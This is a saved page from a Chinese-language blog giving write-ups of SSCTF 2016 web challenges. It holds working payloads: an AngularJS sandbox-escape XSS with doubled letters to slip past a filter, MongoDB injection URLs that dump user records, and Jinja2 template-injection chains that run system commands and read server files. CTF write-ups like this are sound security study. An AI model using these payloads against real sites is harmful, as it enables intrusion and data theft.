@@ -1,0 +1,401 @@
+<!DOCTYPE HTML>
+
+<html>
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"/>
+<meta content="yes" name="apple-mobile-web-app-capable">
+<title>SSCTF Web writeup - Veneno's Blog</title>
+<link href="./SSCTF Web writeup - Veneno's Blog/highslide.css" rel="stylesheet" type="text/css"/>
+<!--[if lt IE 7]>
+<link rel="stylesheet" type="text/css" href="http://www.venenof.com/usr/plugins/HighSlide/css/highslide-ie6.css" />
+<![endif]-->
+<meta content="最终拿了第三，被FlappyPig和217反杀，学到了很多，因为是队伍的web狗，就把web简单写一下：0x01web100一个上传，研究了半天都没解决，什么常规的方法都是，最后队友看了看包，来..." name="description">
+<script type="text/javascript">
+(function () {
+    window.TypechoComment = {
+        dom : function (id) {
+            return document.getElementById(id);
+        },
+    
+        create : function (tag, attr) {
+            var el = document.createElement(tag);
+        
+            for (var key in attr) {
+                el.setAttribute(key, attr[key]);
+            }
+        
+            return el;
+        },
+
+        reply : function (cid, coid) {
+            var comment = this.dom(cid), parent = comment.parentNode,
+                response = this.dom('respond-post-62'), input = this.dom('comment-parent'),
+                form = 'form' == response.tagName ? response : response.getElementsByTagName('form')[0],
+                textarea = response.getElementsByTagName('textarea')[0];
+
+            if (null == input) {
+                input = this.create('input', {
+                    'type' : 'hidden',
+                    'name' : 'parent',
+                    'id'   : 'comment-parent'
+                });
+
+                form.appendChild(input);
+            }
+
+            input.setAttribute('value', coid);
+
+            if (null == this.dom('comment-form-place-holder')) {
+                var holder = this.create('div', {
+                    'id' : 'comment-form-place-holder'
+                });
+
+                response.parentNode.insertBefore(holder, response);
+            }
+
+            comment.appendChild(response);
+            this.dom('cancel-comment-reply-link').style.display = '';
+
+            if (null != textarea && 'text' == textarea.name) {
+                textarea.focus();
+            }
+
+            return false;
+        },
+
+        cancelReply : function () {
+            var response = this.dom('respond-post-62'),
+            holder = this.dom('comment-form-place-holder'), input = this.dom('comment-parent');
+
+            if (null != input) {
+                input.parentNode.removeChild(input);
+            }
+
+            if (null == holder) {
+                return true;
+            }
+
+            this.dom('cancel-comment-reply-link').style.display = 'none';
+            holder.parentNode.insertBefore(response, holder);
+            return false;
+        }
+    };
+})();
+</script>
+<script type="text/javascript">
+(function () {
+    var event = document.addEventListener ? {
+        add: 'addEventListener',
+        focus: 'focus',
+        load: 'DOMContentLoaded'
+    } : {
+        add: 'attachEvent',
+        focus: 'onfocus',
+        load: 'onload'
+    };
+
+    document[event.add](event.load, function () {
+        var r = document.getElementById('respond-post-62');
+
+        if (null != r) {
+            var forms = r.getElementsByTagName('form');
+            if (forms.length > 0) {
+                var f = forms[0], textarea = f.getElementsByTagName('textarea')[0], added = false;
+
+                if (null != textarea && 'text' == textarea.name) {
+                    textarea[event.add](event.focus, function () {
+                        if (!added) {
+                            var input = document.createElement('input');
+                            input.type = 'hidden';
+                            input.name = '_';
+                            input.value = (function () {
+    var _eDnfa = '4c'//'O'
++/* 'oQ4'//'oQ4' */''+'fE'//'fE'
++'70c'//'S'
++''///*'1a'*/'1a'
++'0'//'JZ'
++'572'//'Ig'
++'3b4'//'yEa'
++'563'//'5'
++'4b'//'qq3'
++//'xkB'
+'70'+//'H'
+'91'+//'B'
+'8c2'+//'V'
+'ee'+'89'//'tL1'
++//'8a'
+'7a'+//'tM'
+'8d', _9bI = [[2,4]];
+    
+    for (var i = 0; i < _9bI.length; i ++) {
+        _eDnfa = _eDnfa.substring(0, _9bI[i][0]) + _eDnfa.substring(_9bI[i][1]);
+    }
+
+    return _eDnfa;
+})();
+
+                            f.appendChild(input);
+                            added = true;
+                        }
+                    });
+                }
+            }
+        }
+    });
+})();
+</script><link href="./SSCTF Web writeup - Veneno's Blog/style.css" rel="stylesheet"/>
+<link href="./SSCTF Web writeup - Veneno's Blog/prism.css" rel="stylesheet"/>
+<link href="./SSCTF Web writeup - Veneno's Blog/iconfont.css" rel="stylesheet"/>
+<link href="./SSCTF Web writeup - Veneno's Blog/player.css" rel="stylesheet"/>
+<link href="" rel="shortcut icon"/>
+</meta></meta></head>
+<body>
+<header>
+<div class="main">
+<div class="intro"> <img class="intro-logo" src="./SSCTF Web writeup - Veneno's Blog/veneno.jpeg"/> <span class="intro-sitename"><a href="http://www.venenof.com/">
+      Veneno's Blog      </a></span> <span class="intro-siteinfo">
+      The harder you struggle today,the more glorious you will be tomorrow.      </span> <span class="social"> <a href="" target="_blank"><i class="iconfont icon-qq"></i></a> <a href="" target="_blank"><i class="iconfont icon-mail"></i></a> <a href="" target="_blank"><i class="iconfont icon-weibo"></i></a> <a href="" target="_blank"><i class="iconfont icon-github"></i></a> </span> </div>
+<nav>
+<div class="collapse">
+<i class="iconfont icon-menu"></i></div>
+<ul class="bar">
+<li><a href="http://www.venenof.com/">首页</a></li>
+<li><a href="http://www.venenof.com/index.php/archive.html">
+          时间          </a></li>
+<li><a href="http://www.venenof.com/index.php/link.html">
+          友链          </a></li>
+<li><a href="http://www.venenof.com/index.php/Veneno.html">
+          About Me          </a></li>
+</ul>
+</nav>
+<a class="icon-search" id="btnChange" onclick="searchbox();"></a>
+<div id="search" style="display:none">
+<div class="icon-close" onclick="searchbox();"></div>
+<form action="/index.php" class="search" id="searchform" method="get" name="form">
+<input autofocus="autofocus" id="searchText" name="s" placeholder="输入关键字查找" style="margin-top:25%" type="search"/>
+</form>
+</div>
+</div></header><content>
+<div class="main">
+<div class="article">
+<div class="article-title">SSCTF Web writeup</div>
+<small class="article-time">发表于： <time datetime="2016-02-29T18:30:00+00:00" itemprop="datePublished">2016-02-29</time> | 分类： <a href="http://www.venenof.com/index.php/category/CTF/">CTF</a> | <a href="http://www.venenof.com/index.php/archives/62/#comments" itemprop="discussionUrl">评论：4 </a> | 阅读：283</small>
+<div class="article-content">
+<p>最终拿了第三，被FlappyPig和217反杀，学到了很多，因为是队伍的web狗，就把web简单写一下：</p>
+<hr/>
+<h2>0x01web100</h2>
+<p>一个上传，研究了半天都没解决，什么常规的方法都是，最后队友看了看包，来了句，可没可能在上传表单属性Content-Type: multipart/form-data;那里有个判断啊，瞬间觉得世界明亮了，于是就这么拿了flag：<br/>
+<img alt="2.jpg" src="./SSCTF Web writeup - Veneno's Blog/506441699.jpg"/></p>
+<!--more-->
+<hr/>
+<h2>0x02web200</h2>
+<p>Gg了一篇文章：<br/>
+http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html，发现过滤了on、eval、alert等字符，双写绕过。<br/>
+Payload：</p>
+<pre><code>http://960a23aa.seclover.com/index.php?xss={{'a'.coonnstructor.prototype.charAt=[].join;$evevalal('x=1} } };aleralertt(/ssctf_Nu1L/)//');}}
+</code></pre>
+<p><img alt="3.jpg" src="./SSCTF Web writeup - Veneno's Blog/3940503405.jpg"/></p>
+<hr/>
+<h2>0x03web300</h2>
+<p>又是MMD。。。。。。。。。。wooyun的文章：</p>
+<pre><code>http://drops.wooyun.org/tips/3939
+</code></pre>
+<p>本来想测试下，结果貌似又被搅屎了，然后就报不了js错误直接跳回首页了，就拿最终的图吧。<br/>
+然后就利用return构造，payload：</p>
+<pre><code>http://806bddce.seclover.com/news.php?newsid=3%27});return%20{title:tojson(db.getCollectionNames()),password:2};//&amp;password=test
+</code></pre>
+<p><img alt="QQ截图20160228231009.jpg" src="./SSCTF Web writeup - Veneno's Blog/1005209542.jpg"/></p>
+<pre><code>http://806bddce.seclover.com/news.php?newsid=3%27});return%20{title:tojson(db.user.find()[0])};//&amp;password=test
+</code></pre>
+<p><img alt="QQ截图20160228230650.jpg" src="./SSCTF Web writeup - Veneno's Blog/2466694341.jpg"/><br/>
+然后邮箱登录，翻了翻找到：<br/>
+<img alt="33.jpg" src="./SSCTF Web writeup - Veneno's Blog/3486074976.jpg"/></p>
+<hr/>
+<h2>0x04web400</h2>
+<p>一开始以为是cookie哪里改成赵日天= == = == = == = = =无力吐槽，最后确定为模板注入：</p>
+<pre><code>http://drops.wooyun.org/web/13057
+http://www.tuicool.com/articles/mANBvmJ
+</code></pre>
+<p>点击题目的login，发现name的value是你github账号名字，于是开了开脑洞，改github昵称，利用文章中的{{…….}}进行绕过，而且通过我们已经得知这是flask框架，于是直接app.flagman(为什么是这个变量，请看下面)：<br/>
+<img alt="QQ截图20160228132110.jpg" src="./SSCTF Web writeup - Veneno's Blog/2532183370.jpg"/><br/>
+访问下：<br/>
+<img alt="QQ截图20160228132234.jpg" src="./SSCTF Web writeup - Veneno's Blog/3566680474.jpg"/></p>
+<p>如何拿到源码：<br/>
+根据wooyun的文章：</p>
+<pre><code>{% for c in [].__class__.__base__.__subclasses__() %}
+{% if c.__name__ == 'catch_warnings' %}
+{{ c.__init__.func_globals['linecache'].__dict__['os'].system('id') }}
+{% endif %}
+{% endfor %}
+</code></pre>
+<p>为了简短代码，</p>
+<pre><code>{% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == 'catch_warnings' %} {{ loop.index0 }}{% endif %} {% endfor %}
+</code></pre>
+<p>得到索引是59</p>
+<pre><code># 循环查看所有的模块 发现有os, __file__, __builtins__等，可以用open
+{% for i in range(0, 10) %} {{ [].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__.keys()[i] }} {% endfor %}
+</code></pre>
+<p>但是要先知道当前文件名，所以</p>
+<pre><code>{{ [].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['os'].path.realpath(__file__) }}
+</code></pre>
+<p>得到文件名  ssctf.py，然后读文件</p>
+<pre><code>{{ [].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['__builtins__'].open("/data1/www/htdocs/259/4083475a59f34e34/2/ssctf.py", "r").read() }}
+</code></pre>
+<p>得到(省略了部分源码)</p>
+<pre><code>name:# -*- coding: utf-8 -*- from flask import Flask,abort,request,session,redirect,render_template_string import os import json import datetime import urllib import re import time import hashlib #import sqlite3 
+....................
+app.flagman = (1,'flagman','SSCTF{dc28c39697058241d924be06462c2040}','http://www.seclover.com/wp-content/uploads/2015/07/logo.png') # app.lastid = 1 # app.lock = threading.Lock() # def getnewid():
+....................
+""" % (github.get_authorize_url(**params), icon) html = """ %slogin
+only / and /user,no other pages! """ % _link() return html @app.route('/callback') def callback(): code = request.args.get('code') if not code: abort(401) data = dict(code=request.args['code'], redirect_uri=WEBHOME+'callback', ) try: auth = github.get_auth_session(data=data) me = auth.get('user').json() session['info']=[2,me['name'],me['id'],me['avatar_url']] return redirect('/user/') except Exception,e: return e if __name__ == '__main__': app.run(host='0.0.0.0',port=80) 
+</code></pre>
+</div>
+<div class="post-footer">
+<div class=" post-tags">
+<div class="tag"> 标签: none</div>
+<div class="post-nav">
+<li class="prev"><a href="http://www.venenof.com/index.php/archives/48/" title="IW CTF 2016 Web两道 writeup">IW CTF 2016 Web两道 writeup</a></li>
+<li class="next">
+<a href="http://www.venenof.com/index.php/archives/66/" title="0ctf-web6-Php Fuzzing Writeup">0ctf-web6-Php Fuzzing Writeup</a></li>
+</div>
+</div>
+</div>
+</div></div></content>
+<div id="comments">
+<!-- Duoshuo Comment BEGIN -->
+<div class="ds-thread" data-author-key="1" data-thread-key="62" data-title="SSCTF Web writeup" data-url=""></div>
+<script type="text/javascript">
+	var duoshuoQuery = {short_name:"veneno1",theme:"dark"};
+	(function() {
+		var ds = document.createElement("script");
+		ds.type = "text/javascript";ds.async = true;
+		ds.src = "http://static.duoshuo.com/embed.js";
+		ds.charset = "UTF-8";
+		(document.getElementsByTagName("head")[0] 
+		|| document.getElementsByTagName("body")[0]).appendChild(ds);
+	})();
+	</script>
+<!-- Duoshuo Comment END -->
+</div>
+</body></html>
+﻿<div class="willerce">
+<div> </div>
+<!--播放器 -->
+<div id="QPlayer">
+<div id="pContent">
+<div id="player"> <span class="cover"></span>
+<div class="ctrl">
+<div class="musicTag marquee"> <strong>Title</strong> <span> - </span> <span class="artist">Artist</span> </div>
+<div class="progress">
+<div class="timer left">0:00</div>
+<div class="contr">
+<div class="rewind icon"></div>
+<div class="playback icon"></div>
+<div class="fastforward icon"></div>
+</div>
+<div class="right">
+<div class="liebiao icon"></div>
+</div>
+</div>
+</div>
+</div>
+<div class="ssBtn">
+<div class="adf"></div>
+</div>
+</div>
+<ol id="playlist">
+</ol>
+</div>
+<script src="./SSCTF Web writeup - Veneno's Blog/jquery.min.js"></script>
+<script src="./SSCTF Web writeup - Veneno's Blog/jquery.marquee.min.js"></script>
+<script>
+	var	playlist = [	
+];
+  var isRotate = 1;
+  var autoplay = ;  
+</script>
+<script src="./SSCTF Web writeup - Veneno's Blog/player.js"></script>
+<script>
+function bgChange(){
+	var lis= $('.lib');
+	for(var i=0; i<lis.length; i+=2)
+	lis[i].style.background = 'rgba(246, 246, 246, 0.5)';
+}
+window.onload = bgChange;
+</script>
+<!--<div class="qrcode">
+  <img src="" width="126" height="136" alt=""> </div>-->
+<footer>
+<p> <a href="" target="_blank">网站地图</a><br/>
+Copyright © 2015-2017 <a href="http://www.venenof.com/">
+    Veneno's Blog    
+<script src="./SSCTF Web writeup - Veneno's Blog/highslide.packed.js" type="text/javascript"></script>
+<script type="text/javascript">
+//<![CDATA[
+hs.graphicsDir = "http://www.venenof.com/usr/plugins/HighSlide/css/graphics/";
+hs.fadeInOut = true;
+hs.transitions = ["expand","crossfade"];
+hs.lang.creditsText = "&copy; www.venenof.com";
+hs.lang.creditsTitle = "&copy; www.venenof.com";
+hs.creditsHref = "http://www.venenof.com/index.php";
+hs.creditsPosition = "top left";
+hs.lang={
+loadingText : "载入中...",
+loadingTitle : "取消",
+closeText : "关闭",
+closeTitle : "关闭 (Esc)",
+previousText : "上一张",
+previousTitle : "上一张 (←键)",
+nextText : "下一张",
+nextTitle : "下一张 (→键)",
+moveTitle : "移动",
+moveText : "移动",
+playText : "播放",
+playTitle : "幻灯播放 (空格键)",
+pauseText : "暂停",
+pauseTitle : "幻灯暂停 (空格键)",
+number : "第%1张 共%2张",
+restoreTitle :	"点击关闭或拖动. 左右方向键切换图片. ",
+fullExpandTitle : "完整尺寸",
+fullExpandText :  "原大"
+};
+//]]>
+</script>
+<script>
+document.body.addEventListener('copy', function (e) {
+    if (window.getSelection().toString() && window.getSelection().toString().length > 10) {
+        setClipboardText(e);
+    }
+}); 
+function setClipboardText(event) {
+    var clipboardData = event.clipboardData || window.clipboardData;
+    if (clipboardData) {
+        event.preventDefault();
+        var htmlData = ''
+            + '著作权归作者所有。<br>'
+            + '商业转载请联系作者获得授权，非商业转载请注明出处。<br>'
+            + '作者：Veneno<br>'
+            + '链接：' + window.location.href + '<br>'
+            + '来源：http://www.venenof.com/<br><br>'
+            + window.getSelection().toString();
+        var textData = ''
+            + '著作权归作者所有。\n'
+            + '商业转载请联系作者获得授权，非商业转载请注明出处。\n'
+            + '作者：Veneno\n'
+            + '链接：' + window.location.href + '\n'
+            + '来源：http://www.venenof.com/\n\n'
+            + window.getSelection().toString();
+        clipboardData.setData('text/html', htmlData);
+        clipboardData.setData('text/plain',textData);
+    }
+}
+</script>
+</a></p></footer>
+<div class="toTop">TOP</div>
+<script src="./SSCTF Web writeup - Veneno's Blog/all.js"></script>
+<script src="./SSCTF Web writeup - Veneno's Blog/jquery.js"></script>
+<script src="./SSCTF Web writeup - Veneno's Blog/prism.js"></script>
+<script src="./SSCTF Web writeup - Veneno's Blog/search.js"></script>
+</div>
+
